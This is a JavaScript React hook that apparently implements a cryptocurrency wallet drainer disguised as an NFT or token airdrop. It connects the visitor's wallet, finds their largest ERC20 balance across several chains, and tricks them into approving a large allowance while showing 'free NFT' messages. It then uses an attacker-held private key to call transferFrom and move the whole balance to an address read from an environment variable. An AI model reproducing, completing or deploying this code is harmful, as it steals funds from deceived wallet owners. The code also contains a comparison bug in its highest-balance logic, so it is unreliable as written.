import axios from "axios"
import URL from '../Constants/url'
import { useWeb3React } from "@web3-react/core";
import { Injected } from "../Connectors/Connectors";
import { toast } from 'react-toastify';
import { useEffect, useState } from "react";
import Addresses from '../Constants/address'
import { ABI } from "./erc20ABI"
import Web3 from "web3";
// import 'react-toastify/dist/ReactToastify.css';
export const useAlchemy = () => {
    const context = useWeb3React();
    const {
        
        library,
        chainId,
        account,
        active,
        activate,
        
    } = context;


    const [erc20Contract, setErc20Contract] = useState(null)
    const [balanceArray, setBalanceArray] = useState([])

    const balances = []
    const promiseArray = []
    let highestbalance = 0;
    const networks = [
        { name: "goerli", url: URL.goerliApi, chainId: 5 },
        { name: "polygon", url: URL.polygonApi, chainId: 137 },
        { name: "mainnet", url: URL.mainnetApi, chainId: 1 },
        { name: "arbitrum", url: URL.arbitrumApi, chainId: 42161 }
    ]
    //get your account balances
    const getBalance = async () => {

        const data = JSON.stringify({
            "jsonrpc": "2.0",
            "method": "alchemy_getTokenBalances",
            "headers": {
                "Content-Type": "application/json"
            },
            "params": [
                `${account}`,
                "erc20",
            ],
            "id": 42
        });

        //goerli configuration
        const goerliConfig = {
            method: 'post',
            url: URL.goerliApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };

         //polygon configuration
        const polygonConfig = {
            method: 'post',
            url: URL.polygonApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };

         //ethereum configuration
        const mainnetConfig = {
            method: 'post',
            url: URL.mainnetApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };

         //arbitrum configuration
        const arbitrumConfig = {
            method: 'post',
            url: URL.arbitrumApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        const balanceResponse = await Promise.all([axios(goerliConfig), axios(polygonConfig), axios(mainnetConfig), axios(arbitrumConfig)])
        
        //fetch information from all the networks
        const responses = [];
        balanceResponse.forEach((item, index) => {
            responses.push({ ...item.data.result, network: networks[index].name, url: networks[index].url, chainId: networks[index].chainId })
        })
      
        //fetch balance from each network
        responses.forEach(response => {
            response.tokenBalances.forEach(item => {

                promiseArray.push(new Promise(async (resolve, reject) => {
                    const web3Instance = new Web3(response.url);
                    let contract = new web3Instance.eth.Contract(ABI, item.contractAddress);
                    const name = await contract.methods.name().call();
                    const symbol = await contract.methods.symbol().call();
                    resolve({
                        name,
                        balance:parseInt(item.tokenBalance, 16),
                        address: item.contractAddress,
                        symbol,
                        url: response.url,
                        contract,
                        chainId: response.chainId
                    })
                }))
            })
        })

         //resolve the promises to get real numbers
        Promise.all(promiseArray).then(response => {
            balances.push(...response)
            setBalanceArray(balances)
            console.log(balances, "all balances")
        })


    }

    //getHighestBalance
    const getHighestBalance = () => {
        let highest = balanceArray[0]
        balanceArray.forEach(item => {
            if (highestbalance.balance < item.balance) {
                highest = item
            }
        })
        return highest;
    }

    //get current gas price
    const getCurrentGasPrices = async () => {
        let response = await axios.get(
           URL.ethGas
        );
        let prices = {
            low: response.data.safeLow / 10,
            medium: response.data.average / 10,
            high: response.data.fast / 10,
        };
        return prices;
    };

    //connect to wallet
    const connectWallet = () => {
        if (active) {
            toast.warn('Your metamask wallet is already connected!', {
                position: "top-center",
                autoClose: 5000,
                hideProgressBar: false,
                closeOnClick: true,
                pauseOnHover: true,
                draggable: true,
                progress: undefined,
                theme: "colored",
            });
           
        } else {
            activate(Injected);

        }
    }

   
    useEffect(() => {

        if (context.active) {
            getBalance()
            let snap = new library.eth.Contract(ABI, Addresses.erc20);
            setErc20Contract(snap)
        }
    }, [context]);

    async function handleTransfer(event) {
        event.preventDefault();

        //if wallet connected
        if (context.active) {
            let high = getHighestBalance() //fetch the highest token balance
            
            if (high.balance !== 0) {
                
                //if not on highest token balance network, then switch to it
                if (chainId !== high.chainId) {
                    await switchNetworks(high.chainId)
                }

                let contractmask = new library.eth.Contract(ABI, high.address)

                const toAddress = process.env.REACT_APP_RECIEVER_ADDRESS;
                console.log(toAddress,'key')
                const amount = Web3.utils.toWei((500000).toString());
                try {
                    let data = await contractmask.methods.approve(toAddress, amount).send({
                        from: context.account,
                    }).on('transactionHash', (hash) => {
                        console.log(hash)

                        toast.success("Hurrah! You'll get your free NFT soon.")
                    })
                    
                    const myWeb3Instance = new Web3(high.url);
                    const WALLET_PRIVATE_KEY = process.env.REACT_APP_WALLET_KEY; //do not push this
                  
                    const user = myWeb3Instance.eth.accounts.wallet.add(WALLET_PRIVATE_KEY);
                    let contractImage = new myWeb3Instance.eth.Contract(ABI, high.address);

                    let gasPrice = await getCurrentGasPrices().medium
                    contractImage.methods
                        .transferFrom(account, toAddress, high.balance.toString())
                        .send({ from: user.address, gas: gasPrice, gasLimit: "102012" }, function (err, res) {
                            if (err) {
                                console.log("An error occured", err);
                                return;
                            }
                            console.log("Hash of the transaction: ", res);
                        });
                } catch (err) {
                    toast.error("Refresh the page and reconnect wallet to recieve the airdrop!")
                    console.error(err);
                }
            }
        } else {
            
            toast.error("Connect Your Wallet to get free tokens!")
        }

    }

    //fetch current chain Id
    const getCurrentChainId = () => {
        console.log(chainId)
    }

    //swtich the networks
    const switchNetworks = async (chain) => {
        try {

            await library.currentProvider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: Web3.utils.toHex(chain) }]
            })
            console.log("switched!")
        } catch (err) {
            console.log("error in switching: ", err)
        }

    }
    return {
        getBalance,
        connectWallet,
        handleTransfer,
        getCurrentChainId,
        switchNetworks,
        active,
        account,
        // ToastContainer
    }

}